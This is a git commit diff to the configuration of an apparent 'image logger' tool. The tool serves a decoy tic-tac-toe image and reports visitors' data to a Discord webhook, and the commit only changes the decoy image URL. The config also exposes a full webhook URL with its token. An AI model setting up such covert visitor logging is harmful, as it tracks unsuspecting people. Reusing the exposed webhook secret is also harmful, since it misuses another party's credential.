1db2f357e60de01abf966450131698c2b95afc24
danielmarkr123 <57351617+danielmarkr123@users.noreply.github.com>
2026-06-25 00:58:19 +0200

    Update main.py

--- api/main.py
+++ api/main.py
@@ -13,7 +13,7 @@ __author__ = "C00lB0i"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1519468796904083506/eNYHdMJzLYWJtVK8F7dTFNzENAi1ULs6PEZm4V84VJm7q-EjugfYzKL7xbZfFSsFhfl3",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/6/64/Tic-tac-toe.png", # You can also have a custom image by using a URL argument
+    "image": "https://www.pngkey.com/detail/u2w7w7i1u2r5y3o0_gameboard-tic-tac-toe-png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
